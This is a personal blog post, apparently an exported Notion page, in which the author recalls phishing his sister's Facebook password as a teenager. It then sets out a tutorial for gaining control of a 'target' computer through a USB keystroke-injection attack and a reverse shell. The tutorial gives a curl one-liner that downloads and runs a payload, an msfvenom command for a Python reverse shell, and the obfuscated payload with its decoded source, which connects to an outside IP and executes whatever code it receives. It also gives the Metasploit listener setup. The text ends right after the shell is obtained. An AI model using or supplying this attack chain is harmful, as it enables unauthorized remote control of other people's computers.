id="d1e14edb-d989-41c8-a937-12445f8fe7fe" class="">When I started off in CS I was a script kiddy.</p><p id="43aa277d-4cee-46ed-a595-82100679e2ab" class="">Someone who just ran what was available and didn&#x27;t make anything of their own. I wanted to test things that I had no idea how to build.</p><p id="53cceb2a-0f03-483f-a4f4-aa7b8e80964c" class="">
+</p><p id="50b860e3-44a0-4135-ba55-6f0ad9c19c80" class="">Over time I began creating more and more of my own hacks. I remember a funny one was when my sister stole my bike and posted on her facebook &quot;When you steal your brothers bike&quot;.</p><p id="e8c22646-facb-4792-b710-5ecfb6cdd6d6" class="">
+</p><p id="cac3f4ec-6689-4f0d-ab0d-073c5aeedccc" class="">This may not be a big deal to most, but it was to me. It was my brand new bike, and she broke my last one. </p><p id="a93ecb0b-e405-4c30-b889-902a5a89d7d2" class="">
+</p><p id="9c71414c-3b68-4a08-a48a-5873642d9e85" class="">I wanted payback. At that point all I know was HTML and CSS, however I was using this tool called formspree to collect feedback with the HTML form element.</p><p id="de0f244d-b73f-4139-ad0e-3f173c2eb045" class="">
+</p><p id="64b5a1c5-3ed4-47be-ae98-bfcd60515b5a" class="">So I created a clone of the facebook login page, used formspree as a &quot;backend&quot; and fired it at my sister with a phishing email. It worked, I got her login details and posted &quot;don&#x27;t steal your brothers bike or he will hack your account&quot;. It was cringe, but as a 14 year old I had fun.</p><p id="16fa5892-9218-4ae8-9c8d-1b3aec0298e2" class="">
+</p><p id="6377cf08-f0c3-49d9-a08d-5afc721969f9" class="">Then I really got into Kali (an operating system dedicated to security and hacking), and started using tools like MITMF and the Beef Framework to demonstrate my skill and knowledge to friends and family. Most of the time they were just concerned I was going to permanently break their devices, which did take the fun out of it since I just wanted to show them something cool.</p><p id="5643646d-26b1-409b-9a1c-7c9b96e6cab5" class="">
+</p><p id="4d479293-d9ca-49de-8061-99a8c27f5edb" class="">Fast forward, I am now 19. Have created many projects from scratch. But my path split from cybersecurity into web dev. Now, I want back.</p><p id="33ba6e84-d467-46cf-a80f-fbc352f42e10" class="">
+</p><p id="d7a75f81-a2bf-4373-afe6-f35b62fa195e" class="">My goal is to gain control of a target computer, preferably by plugging in a USB device that will work for a couple of seconds and then BOOM, im in.</p><p id="2db7538d-4363-486d-a1c8-7ec8126cb788" class="">
+</p><p id="c9c30a75-d9ea-4f83-89e1-942c092facf2" class="">I plan on accomplishing this by doing a reverse shell. A shell is the command line of a computer. Here you can do so many different things, open and close programs, go to websites, copy delete and do about anything else with files. Along with control certain things about the computer.<div class="indented"><p id="0062adb9-85b3-4875-9077-edfff6c5cf2d" class="">
+</p></div></p><div id="4a06d9b6-3e9e-422b-a8a7-26089919fa5a" class="column-list"><div id="2475fcb0-3f29-4aca-b386-f776dce84ab1" style="width:50%" class="column"><p id="e909a933-a141-4849-a65e-8354b0417d97" class="">Windows has CMD</p></div><div id="f0dcf476-d412-49aa-879d-05d41f744963" style="width:50%" class="column"><p id="522acc70-1118-4a20-94e0-43b754dfb3c4" class="">Mac has terminal</p></div></div><p id="3b5121ed-37e0-405c-9896-ff5b26c878f0" class="">
+</p><div id="16dcf07b-554b-4548-a485-79d499ce61be" class="column-list"><div id="2e4e0366-8297-4e1f-aeee-31687168cc24" style="width:50%" class="column"><figure id="da714e62-d521-4a5f-9861-0545fae93af6" class="image"><a href="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2F2.bp.blogspot.com%2F--ux0UBJAg-c%2FUNan4OCdF6I%2FAAAAAAAAANE%2FDS4QihAE2xI%2Fs1600%2Fcmd.jpg&amp;f=1&amp;nofb=1"><img style="width:384px" src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2F2.bp.blogspot.com%2F--ux0UBJAg-c%2FUNan4OCdF6I%2FAAAAAAAAANE%2FDS4QihAE2xI%2Fs1600%2Fcmd.jpg&amp;f=1&amp;nofb=1" /></a></figure></div><div id="b1ce3a6f-b805-4902-a566-80332e44855c" style="width:50%" class="column"><figure id="b8870c07-ed01-4323-a4b6-6852a6d2033a" class="image"><a href="/assets/Gaining%20co%20b8870/Screen_Shot_2021-10-14_at_2.33.42_PM.png"><img style="width:1144px" src="/assets/Gaining%20co%20b8870/Screen_Shot_2021-10-14_at_2.33.42_PM.png" /></a></figure></div></div><p id="fcbdae19-31a0-4e14-9558-72203d234884" class="">If I have access to this, I basically can do whatever the current user logged in can do. I usually like using the &quot;say&quot; command on Mac to make the computer say something on speaker.</p><p id="ca3d8072-3a0a-437b-8127-56f716bf7560" class="">
+</p><p id="91adec1c-6466-44e2-9caa-b081fec50d8c" class="">But how do we get access to the TARGETS shell from our computer? Well we can&#x27;t connect to them because it&#x27;s locked, instead, we have the TARGET connect to us. This is called a reverse shell.</p><p id="5efc3341-fe87-47d3-8e9a-c07ab499a5c0" class="">But how do we get the TARGET to connect to us? Well we can have the target computer run a command or program.</p><p id="37593c82-e917-4e40-9509-b01cd3ac9b7c" class="">Then the question becomes how do we get the TARGET to run that command or program?</p><p id="ce2f7fdd-98f8-4ba1-b3ac-c32312bacb70" class="">
+</p><p id="1273d57d-b2b9-4bdd-bafe-6ac194527030" class="">What you see here is what hacking is, it&#x27;s not one step. Its multiple steps and &quot;hacks&quot; that lead to the end result.</p><p id="27449bec-9dd9-4712-a577-8fc10048ff77" class="">
+</p><p id="b9889304-415d-47eb-ac2f-8544947f8f03" class="">The way that I want to do this, is use a usb device that pretends its a keyboard. Which Windows will just say &quot;Do whatever you want&quot;, then use that to quickly type in and run the command. This is called injecting keystrokes. Since we are using the USB to pretend to be the user.</p><p id="bc68b39d-ce73-4b56-9bb3-dc8609a01b01" class="">
+</p><p id="6a9bc76c-6456-48f6-9ec1-fe357cab7973" class="">What kind of program do we need the TARGET computer to run? We need it to run something that is called a payload, once the payload is run it will connect to our server, download more information to the TARGET and then act like the middle-man.</p><p id="d4823bf1-d8fe-4b09-b06c-dad38842bfeb" class="">
+</p><p id="3c50c72e-b0c3-4444-9934-25c63e063bca" class="">We will create the payload using the Metasploit framework, and the server it will connect to will also be with Metasploit.</p><figure id="b18d0106-86bb-4de4-b922-89cb3985a649"><a href="https://www.metasploit.com/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Metasploit | Penetration Testing Software, Pen Testing Security | Metasploit</div><div class="bookmark-description">New modules for vCenter Server and Linux Netfilter, plus fixes and enhancements.... More post modules than we&#x27;ve ever put out in a single release before, courtesy of a university project to add credential gathering capabilities based on the PackRat toolset.... A new evasion module, an exploit for ManageEngine OpManager, fully functional shells over WinRM, and major RDP library improvements....</div></div><div class="bookmark-href"><img src="https://www.metasploit.com/includes/images/favicon.ico" class="icon bookmark-icon" />https://www.metasploit.com/</div></div><img src="https://www.metasploit.com/includes/images/metasploit-og.png" class="bookmark-image" /></a></figure><p id="417814f7-24b1-478a-8135-7958f6bbf3d5" class="">
+</p><h1 id="6cafcde2-e235-468e-b24e-a1885a1df038" class="">Download and run the code with one line</h1><p id="3c0007d6-eda2-4c19-992f-a103ad7df02c" class="">When we have the opportunity to run a command on the TARGET computer, we don&#x27;t want to have to find the file online, download it, then run it. Instead we want to be able to do everything in one line.</p><p id="5b9bfda1-3d59-494a-a958-5225cfcd486a" class="">
+</p><p id="4b68ebc1-4d3c-4baa-a068-77c4c9a1a3b2" class="">The tool &#x27;Curl&#x27; is used to transfer data using URLS. So we can download and save the python file, without ever opening a browser (like Chrome or Firefox)</p><p id="9e847617-4f84-43cd-90ce-d8d048cf0451" class="">
+</p><pre id="01917a2e-7dee-43e9-82ae-b6b3ee3b5d2e" class="code"><code>curl https://google.com &gt; thisFile.txt</code></pre><p id="1f093bff-e7ac-48ac-8577-d189f3bb5e95" class="">The above command will download whatever is on <a href="http://google.com">google.com</a> which would basically be the logo, some links and a search bar. And then will save it to &quot;thisFile.txt&quot;</p><p id="8b6bd9d8-f2fc-4374-8c51-69211cfed10f" class="">
+</p><p id="5f0a42a0-4ebd-4a23-a108-15ca4fabfbf1" class="">We can use GitHub to save the code as a link:</p><figure id="9f6f598a-427c-448a-abf5-abd35f675848"><a href="https://gist.github.com/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Discover gists</div><div class="bookmark-description">You can&#x27;t perform that action at this time. You signed in with another tab or window. You signed out in another tab or window. Reload to refresh your session. Reload to refresh your session.</div></div><div class="bookmark-href"><img src="https://gist.github.com/favicon.ico" class="icon bookmark-icon" />https://gist.github.com/</div></div><img src="https://github.com/opengraph.png" class="bookmark-image" /></a></figure><p id="d305dc6e-c6e9-4950-9148-d5e1bc8ff600" class="">
+</p><p id="035e6b8b-f232-4f7d-bb1d-419796166a4e" class="">Once the payload code is pasted in the box. Click save, then click raw. That will provide us with the RAW code. Meaning nothing but the code.</p><p id="e7c8215c-9a5d-4ce9-9a6b-540fec536c36" class="">
+</p><p id="79c10f3b-adeb-4260-9501-44433fb53173" class="">Now we can CURL that link and save it to the python file. Mine would look like the following</p><p id="37d82471-d79e-49df-9427-82f314aeda35" class="">
+</p><pre id="a6aea6a2-978e-4a31-aa32-311ca9df8fb2" class="code"><code>curl https://gist.githubusercontent.com/lennymelnik/fac58ce5a79fd078048607f843b16a45/raw/ba7296a7f4dd2aae9dc3de1608b48c375b6ac7ee/gistfile1.txt &gt; payload.py</code></pre><p id="8794f0cc-7e06-4146-aeba-8bc35ef1efe0" class="">
+</p><p id="bc405acd-cc9a-4200-a5f6-eec2ffe221f9" class="">then in order to run the code we just have to do</p><pre id="8e09d24d-3778-47fc-83f8-7ce85c8bc681" class="code"><code>python payload.py</code></pre><p id="c55130d1-f3f6-4489-9416-71d28446f2d7" class="">
+</p><p id="3ac4cb09-57e5-49a3-bc06-6add2b992cab" class="">But lets put it all together</p><p id="f93e304d-2ee7-4f21-a75a-b462bb5a7be6" class="">
+</p><pre id="dfe16965-b2eb-4980-8079-3220cc75071a" class="code"><code>curl THERAWLINKHERE &gt; payload.py &amp;&amp; python payload.py</code></pre><p id="53ea04c4-8656-408e-993b-e8172db2b270" class="">As soon as the code is saved to the file, it will run it. </p><p id="b10fd130-4958-4336-93c2-6086c2b6fe77" class="">
+</p><h1 id="e9102baf-525c-4c98-bcb8-9f59347f7575" class="">Creating the payload</h1><p id="3e9b0070-c90a-4111-8fcc-0648f7f2666f" class="">Let&#x27;s create the payload. For this you will need to have metasploit installed, I&#x27;ll have a link below for instructions.</p><p id="d59ff9b7-6c87-4206-9974-a824dd919c6c" class="">We will use the msfvenom program in the metaploit framework to make the payload. You can even think of the payload like venom, we get in through a small hole. But then it spreads everywhere and can have a massive impact.</p><p id="8a821482-019a-4dba-9086-2175f728c254" class="">
+</p><p id="5ccf261d-f788-40cd-94f6-2adca70bc0ae" class="">I want this hack to work on every computer, so I need a type of file that is run the same regardless of whether it is run on Windows, Mac, or Linux.</p><p id="c22bd2c0-6ee7-4241-9921-507e0688a8a2" class="">
+</p><p id="e62528a3-be7e-4ae2-b8ef-b7e6dff41c2d" class="">I settled on Python. Python is a relatively simple programming language that can run on any computer given it has Python installed (We will get around this later).</p><h2 id="e5287ccf-0781-4550-a70b-43b5d3c46d5b" class="">Generate using MSFVENOM</h2><p id="5e8cf9dd-b90e-4c09-be63-9aa2fbd1f0ec" class="">
+</p><pre id="5aca6cca-d9e1-4274-9ff3-d1a6ca0c578f" class="code"><code>msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=4545 -f raw &gt; shell.py</code></pre><p id="64f83504-b3e8-41ac-9d03-ca60ed51b361" class="">
+</p><p id="94cc2255-dcc6-4014-a697-52756e3a66a2" class="">This is the command we can run to generate the payload with msfvenom. It makes a python file, that when launched will connect to the IP 10.10.10.10 on port 4545. </p><h2 id="d845cd86-ea16-4bbf-965c-3573b6570595" class="">What is inside the payload?</h2><p id="ca826a3c-bf80-4dee-b76b-2765446a3718" class="">If we open up the <a href="http://shell.py">shell.py</a> file generated by MSFVENOM we see the following.</p><pre id="88f2d794-ca54-4cf3-a4bd-b6554f62177d" class="code"><code>exec(
+__import__(&#x27;base64&#x27;).b64decode(
+__import__(&#x27;codecs&#x27;).getencoder(&#x27;utf-8&#x27;)(
+&#x27;aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEwOC40Ni4yMTIuMTYnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=&#x27;)[0]))</code></pre><p id="318f9091-16f0-448e-b426-42c49d606c49" class="">It looks like gibberish right? Well, thats the point. It changed its form from regular text to something called base64. This is also called obfuscation. This way if someone opens the file, it is not apparent what it does. </p><p id="c444ac6b-081d-4c0a-8575-608da3fe52ce" class="">All those random letters and numbers you see is the actually python code we will need to run.</p><p id="31a39626-7d33-459e-9741-82497cfda75d" class="">The string decoded looks like: (Just run it through a base64 decoder you find on google)</p><pre id="acb92cc2-830e-4abb-9989-d031c56de570" class="code"><code>import socket,zlib,base64,struct,time
+for x in range(10):
+	try:
+		s=socket.socket(2,socket.SOCK_STREAM)
+		s.connect((&#x27;LISTENINGSERVER_IP&#x27;,4444))
+		break
+	except:
+		time.sleep(5)
+l=struct.unpack(&#x27;&gt;I&#x27;,s.recv(4))[0]
+d=s.recv(l)
+while len(d)&lt;l:
+	d+=s.recv(l-len(d))
+exec(zlib.decompress(base64.b64decode(d)),{&#x27;s&#x27;:s})</code></pre><p id="d2fa2466-39d6-4ba9-9930-37d107a23a46" class="">Which is much simpler than I thought. </p><hr id="95f42176-5a83-4fb5-86ee-4e7f99d29bfa" /><h3 id="5e418dea-2799-48a0-9a15-f77f51ea432e" class="">Breaking down the payload</h3><p id="8f0092b2-6ba8-4099-9933-83bb52fe58d8" class="">
+</p><p id="dc51333f-cada-46f0-ad4f-74cce399ac50" class="">To break this down. we import a bunch of library&#x27;s in this line. This is code that has already been written that we want to use</p><pre id="d43f0ddd-4fe6-4867-b0e8-e1d6faba599f" class="code"><code>import socket,zlib,base64,struct,time</code></pre><ul id="fa6fee0c-25d6-472c-9422-133dcc2c7792" class="bulleted-list"><li style="list-style-type:disc">Socket - Low-level networking interface</li></ul><ul id="20e2c10c-6408-4b1c-ba52-a4fece87ff80" class="bulleted-list"><li style="list-style-type:disc">zlib - Compression and decompression</li></ul><ul id="1a456818-2545-4052-9313-4d820c3bedaa" class="bulleted-list"><li style="list-style-type:disc">base64 - To encode  and decode in base64</li></ul><ul id="daf08b06-8a7b-4cf6-979e-bb74f8b1754b" class="bulleted-list"><li style="list-style-type:disc">struct - Converts between python and C structs (think of it as an list that can have different variable types)</li></ul><ul id="dcfba2d5-1ecc-4f30-9348-322db386b116" class="bulleted-list"><li style="list-style-type:disc">time - Lets us perform time related functions</li></ul><hr id="3c00afe1-b48b-4c74-8fae-ec9fc1d1e101" /><p id="1d3e937b-9015-429f-ab40-648b67ad990c" class="">
+</p><p id="89fe1c58-29f7-40a8-8b6e-6dc498ae30ae" class="">Now lets move on to the loop</p><pre id="dab98045-1c5b-4f2c-a701-54cf581ff20c" class="code"><code>for x in range(10): // Here we are saying to repeat 10 times
+	try:
+		s=socket.socket(2,socket.SOCK_STREAM)
+		s.connect((&#x27;LISTENINGSERVER_IP&#x27;,4444))
+		break
+	except:
+		time.sleep(5)</code></pre><p id="9c41dd8a-729c-446e-8228-cfa8d20db379" class="">
+</p><p id="e2cfdacf-56a1-4ffc-a52e-efba46edd2af" class="">This will repeat 10 times.</p><p id="0533c43e-4dd6-4760-860e-23e440fa8de6" class="">It will attempt (try) to connect to the server, IF it works, then it will stop trying again (break). IF it does not work, then it will wait for 5 seconds, then try again (until the 10 attempts are over)</p><hr id="587e5041-23f1-412f-a23b-68a0ed4afeb7" /><p id="c7faf631-ac75-4348-9f53-223edc1cde6a" class="">
+</p><pre id="eb34005b-df7c-4069-b2a9-77112e1b2759" class="code"><code>l=struct.unpack(&#x27;&gt;I&#x27;,s.recv(4))[0]
+d=s.recv(l)
+while len(d)&lt;l:
+	d+=s.recv(l-len(d))
+exec(zlib.decompress(base64.b64decode(d)),{&#x27;s&#x27;:s})</code></pre><p id="518541ea-af0a-4201-8875-de856b7ddb63" class="">
+</p><p id="14617c8c-156f-42d4-9690-05ee910c4e75" class="">I have no idea whats going on here. But I will try to figure it out line by line.</p><p id="fe1980ad-23a0-4a81-a496-d607f237607a" class="">
+</p><pre id="05e8a7eb-43db-4bcd-b2db-09e91a9885ae" class="code"><code>l=struct.unpack(&#x27;&gt;I&#x27;,s.recv(4))[0]</code></pre><p id="90b6cc2e-9727-4b64-8633-8aa65a43166c" class="">
+</p><p id="9ba5660a-a486-4387-8bb2-ea77cd54fec2" class="">struct.unpack() is a function that unpacks</p><p id="8c80b8b2-8c9d-47e5-a14b-d25b813f7688" class=""><mark class="highlight-yellow">&#x27;&gt;I&#x27;</mark> is the format/size of the struct</p><p id="78ab6b9e-1509-4c00-b929-ef1bc84a7fe1" class="">Remember how we connected to the server using the variable <mark class="highlight-teal">s</mark></p><p id="d49a438e-e960-434a-aa83-636b2a528d47" class="">Well by now we have a connection, so we use <mark class="highlight-teal">s.recv(4)</mark> to receive data from the server. In this case 4 represents an argument for the function (Data that we give it) which is the buff-size we request (Think of it like size of the data)</p><p id="2fec1aa9-ed31-4003-9648-bda8d5761984" class="">So this line unpacks the data from the server, of size <mark class="highlight-yellow">&#x27;&gt;I&#x27;</mark>,  then takes the first element ([0])</p><p id="cd82c55f-78bc-44e5-b077-8e802541d2e3" class="">
+</p><p id="f6a3adfc-3d3f-4a81-8274-cf52044c49b3" class="">Im guessing that first element we just got is the size of the next data that will be received, because we take it and use it as an argument to receive more data from the server.</p><pre id="70146fe9-671b-48d7-8fed-0a278e743a7d" class="code"><code>d=s.recv(l)</code></pre><p id="7d23219e-af78-4e02-ab35-02ea731c7544" class="">
+</p><p id="33413084-bf23-420a-9d8d-76adcfe76cfd" class="">So now d is the next set of data we got</p><pre id="c4d986b8-223e-4010-8083-ff1dd5027978" class="code"><code>while len(d)&lt;l:
+	d+=s.recv(l-len(d))</code></pre><p id="d2bb78c1-7355-4d6e-9ef7-a46dc3b09c52" class="">while the length of the data in variable d is less than the value of l.</p><p id="e91981f4-65e6-4a06-9a27-9b542a1ffa3b" class=""> Keep adding to <mark class="highlight-teal">d</mark> the data from the server that is the difference between <mark class="highlight-teal">l </mark>and the length of data in d. To make sure that we get all the data I guess.</p><p id="9656392a-39a6-470c-a432-09dfeca3ca6c" class="">
+</p><pre id="fdebf375-a915-401a-81f3-91cd561d10fb" class="code"><code>exec(zlib.decompress(base64.b64decode(d)),{&#x27;s&#x27;:s})</code></pre><p id="55976956-ba2f-4835-ab09-f8d5297ef730" class="">exec takes a python code inside of a string and runs it</p><p id="63330ca0-6faf-4f9c-97da-beac2b13924b" class="">In this line we are going to work inside out.</p><ol type="1" id="228b2c92-9637-4806-9bd8-75ddbbc8ad5c" class="numbered-list" start="1"><li>Decode the data in <mark class="highlight-teal">d </mark>from base64</li></ol><ol type="1" id="ab890cbd-d7c6-429b-890f-3bec43e0a982" class="numbered-list" start="2"><li>Decompress it</li></ol><ol type="1" id="6c1ba3ca-d192-489d-a8c5-11bc2eae510c" class="numbered-list" start="3"><li>Run it</li></ol><p id="995eef81-9018-41f5-aadb-94f15d515c4a" class="">
+</p><h2 id="55527807-1146-409c-a68c-02e6457295b1" class="">Running the payload</h2><p id="ca896d89-d927-4a7f-b592-92df9c9c08e5" class="">
+</p><p id="35f57fd8-54e9-4bdb-8316-2389b92b8f9d" class="">Lets try to test if the payload works!</p><p id="07230daf-145e-45c6-8702-964e0c0a6fda" class="">
+</p><p id="c232bafe-0d36-443a-91d5-6b696a0816a2" class="">I did this by creating a python file on my computer (Just create a file with the extention of .py)</p><p id="aca83c15-efbf-4710-878a-aca7179b1ce7" class="">
+</p><p id="b6a32738-ce08-4967-a713-89475416abb3" class="">Pasted in the code that MSFVENOM generated. And saved it</p><p id="77109714-72f4-4c92-b8b1-ae654263f477" class="">and then I launched it. </p><pre id="d031cc6a-5c02-47ae-83ba-2586439ad526" class="code"><code>python payload.py</code></pre><p id="9ba28ab8-3a7c-44a9-b5da-072ffb244fa9" class="">Im using Python to run the Python program.</p><figure id="00ae9f39-11ca-47ac-82a1-e0c7eb963cd1" class="image"><a href="/assets/Gaining%20co%20b8870/Screen_Shot_2021-10-14_at_3.09.24_PM.png"><img style="width:1140px" src="/assets/Gaining%20co%20b8870/Screen_Shot_2021-10-14_at_3.09.24_PM.png" /></a></figure><p id="55e3c267-9156-4a08-90ea-5fb2ccd8a708" class="">But, its kinda stuck there and not doing anything?</p><p id="3192d267-c247-4eb5-91c0-4cf1e7aef70c" class="">
+</p><p id="98689352-8027-4d0b-a775-5bca1051eb06" class="">Heres why, the payload gets information from the server/listener. And we haven&#x27;t set that up yet</p><p id="d076319d-f03c-4d5f-a836-4ed9fcbbbe16" class="">
+</p><h1 id="29e3ba89-8882-454a-bc6d-d6eed3dc3518" class="">Start the listener</h1><p id="70908c0f-25fc-4467-8d8a-a89aca21894f" class="">
+</p><p id="47517586-a08d-4efd-99ab-8c1935c881f5" class="">First off, remember how I mentioned the target computer needs to connect to us? Well, we LISTEN for that signal and then are able to connect. That&#x27;s why its called a listener, it waits for the TARGET to reach out.</p><p id="72132c5a-36e8-4b41-8d58-d1fcc6a88cde" class="">
+</p><p id="3ecd2805-80dd-4199-9b6a-028aadfec7cb" class="">First we need to start up msf console</p><figure class="block-color-yellow callout" style="white-space:pre-wrap;display:flex" id="9f5dcade-ed5e-481c-b798-2d4592a7ede1"><div style="font-size:1.5em"><span class="icon">🔬</span></div><div style="width:100%">Metaploit installs on different locations. </div></figure><pre id="1fa6ace1-e07f-4677-93fe-fbf95ff69268" class="code"><code>./msfconsole</code></pre><figure id="82b97427-2892-41f7-9b12-343b5d77e04d" class="image"><a href="/assets/Gaining%20co%20b8870/Screen-Recording-2021-10-14-at-3.24.59-PM.gif"><img style="width:1140px" src="/assets/Gaining%20co%20b8870/Screen-Recording-2021-10-14-at-3.24.59-PM.gif" /></a></figure><p id="26b5399b-1836-47e4-bbf8-f1bf94894742" class="">
+</p><p id="386de9a9-cbd3-4d4d-974b-1e40850ebd64" class="">Once we are in MSFCONSOLE. We want to use exploit/multi/hanlder</p><p id="c8aea75d-98a9-4e7e-a35e-43457ea4a5c8" class="">
+</p><p id="2bde9f89-2031-4676-9ee0-ac054070c4db" class="">Based on the name, this lets us handle multiple exploited targets at once</p><p id="308ba16f-5a43-414d-9b80-7f9ac46e2846" class="">
+</p><pre id="e7ee61d6-7324-4ef1-8615-68405873d508" class="code"><code>use exploit/multi/handler</code></pre><figure id="41e2edce-a81c-4454-9987-0c31f963ddd4" class="image"><a href="/assets/Gaining%20co%20b8870/Screen-Recording-2021-10-14-at-3.34.21-PM.gif"><img style="width:1140px" src="/assets/Gaining%20co%20b8870/Screen-Recording-2021-10-14-at-3.34.21-PM.gif" /></a></figure><p id="90712833-6107-4003-9f24-701a2f847b1f" class="">
+</p><h3 id="86d42669-c587-4a1a-a1e9-86a7f244633f" class="">Set payload to listen to</h3><p id="b16a2fd5-2c3e-4d4a-8fdd-b48c2f893a2a" class="">
+</p><p id="e239f00c-3a02-40a3-a1bd-be8cd00a441e" class="">We need to make sure that the listener knows what signal it should be listening too. Kind of like after you make a starbucks order, you listen for your name</p><p id="32e23e7d-3d48-4003-a700-0866f96dcbcd" class="">
+</p><pre id="128e0a2c-619f-4155-bc02-8fc291b63b9a" class="code"><code>set PAYLOAD python/meterpreter/reverse_tcp</code></pre><h3 id="bf707343-5a3a-446e-bb0f-3ca5f4cb9d57" class="">Set IP address to listen to</h3><p id="0b285cbc-6d56-4263-b4a2-31fdfb92acf6" class="">This would be our computer (the one that is listening) ip address. Think of it like an actual address. Sometimes, computers can have mutliple addresses, so here we are telling it specifically which one to listen to.</p><p id="c80cd53a-c9a3-443a-a298-b1f6da030f4a" class="">
+</p><pre id="75db4700-62ef-48f6-81d5-67d1c2d1003d" class="code"><code>set LHOST 192.168.0.17</code></pre><p id="fd22b1df-bea3-459c-9ccc-0a5b97e732a2" class="">In order to find your own computers ip address on windows CMD you can type </p><pre id="e563a76e-1cef-49a0-bf41-b34190ab401e" class="code"><code>ipconfig</code></pre><figure id="45529a72-7199-41a6-806e-f430fd51faf5" class="image"><a href="/assets/Gaining%20co%20b8870/Untitled.png"><img style="width:1128px" src="/assets/Gaining%20co%20b8870/Untitled.png" /></a></figure><p id="5f269dec-6e78-426f-840e-b235cbbdfd56" class="">
+</p><p id="932a2443-48c0-471b-9aaf-ef18067824e9" class="">Where it says &quot;IPv4 Address&quot;, that is your computers &quot;local&quot; ip. (The ip on the current network)</p><p id="4a1ab6d3-448b-465b-aacc-0cb1b098e68e" class="">
+</p><p id="d6dd218a-1890-4428-b858-45c51c44bef1" class="">Your IP will changed based on what network you are connected to. Kind of how your room switches as you move houses. Its still your room, just a different address</p><p id="aac69ef7-7603-4fbc-b6b0-4b21b9140877" class="">
+</p><h3 id="041c1783-c35b-4c3d-8bf9-f44ecf786fd1" class="">Set port to listen to</h3><p id="a5a14016-f017-4d2a-99e3-0230a375af60" class="">
+</p><p id="1aa9301b-1e4f-4a37-be0b-b686d09754ef" class="">Think of a port, like a space on a parking lot to a building (the building being our computer). There are 65535 total ports. Sometimes one can be reserved for a specific application. Like how a parking spot can be reserved. Port 80 and 443 are for websites. I used 4444 just because its not used by any other software I have.</p><p id="6c326940-7997-4c2c-b83a-dcd9076cea73" class="">Make sure this is the same port that is in the payload.</p><pre id="5ddcf956-2574-4838-85bf-2ae62c114f50" class="code"><code>set LPORT 4444</code></pre><p id="9ed762b3-04b9-453a-b836-e3d31e67c224" class="">
+</p><h3 id="ea1be99e-3609-439f-9ada-e96758e59fb1" class="">Start the listener</h3><p id="e885e995-e61d-4f3c-8abc-bb5f8825edf0" class="">
+</p><pre id="4a75b6b9-3888-46c3-b4f6-dcf587e079ea" class="code"><code>exploit</code></pre><figure id="13a0d0a2-9427-436b-ac94-2b4eda2c3a43" class="image"><a href="/assets/Gaining%20co%20b8870/Screen-Recording-2021-10-17-at-4.27.20-PM.gif"><img style="width:1432px" src="/assets/Gaining%20co%20b8870/Screen-Recording-2021-10-17-at-4.27.20-PM.gif" /></a></figure><p id="61943d9e-b072-47c2-ace2-80d4c79bb129" class="">
+</p><h1 id="cffd55c5-acef-4e7f-98c4-555d3589a0f7" class="">Running the payload on Mac/Linux</h1><p id="634355b4-52fa-41aa-ad51-501bceba8bfa" class="">
+</p><p id="21271c9c-a50f-41e9-92b2-32fdb40545e8" class="">
+</p><div id="9d4df224-3c13-4dd1-aa0b-6f8fdd4b58a9" class="column-list"><div id="f075079c-e2fc-4598-9db4-c2dabeda2c97" style="width:50%" class="column"><p id="b8f1f948-49a8-4288-917e-86eaa3b5eef7" class="">Target running the payload</p></div><div id="79cfecb2-1769-41e9-8e0d-26010524787d" style="width:50%" class="column"><p id="f85cfc72-f184-4f2c-a0fa-789400445bb9" class="">Listener</p></div></div><div id="eec931b1-72f6-43a1-be2e-ebe716c06baf" class="column-list"><div id="4fe12aac-0738-4cd6-b6b0-5ac7bc3f272e" style="width:50%" class="column"><figure id="b3a08d7f-6273-4a10-87e7-2a011a0d260d" class="image"><a href="/assets/Gaining%20co%20b8870/running.gif"><img style="width:1426px" src="/assets/Gaining%20co%20b8870/running.gif" /></a></figure></div><div id="deadb6b6-889d-4a2f-847b-ab27d950e670" style="width:50%" class="column"><figure id="0f2c0e82-efe2-43b0-8473-e9e6010e2881" class="image"><a href="/assets/Gaining%20co%20b8870/working.gif"><img style="width:1426px" src="/assets/Gaining%20co%20b8870/working.gif" /></a></figure></div></div><p id="85901dd8-ccc9-48ab-999e-0c101fc58edc" class="">
+</p><p id="141046f2-5695-4247-9126-6497a6903585" class="">Congradulations! We now have a shell!</p><p id="78c5d360-2511-487a-b92d-5efd09de57d6" class="">
+</p><p id="976ce1b5-e8d1-460d-ad7c-7586c7858456" class="">We can verify which computer we are connected to by running the command:</p><pre id="289ef9a2-cf23-423b-bc0e-52e05be8d37b" class="code"><code>sysinfo</code></pre><figure id="356e339e-1133-48ea-9f9b-6a9e57327c2e" class="image"><a href="/assets/Gaining%20co%20b8870/Demo.gif"><img style="width:1426px" src="/assets/Gaining%20co%20b8870/Demo.gif" /></a></figure><p id="42fe65a2-2851-484d-b7de-982bdaa25cb1" class="">
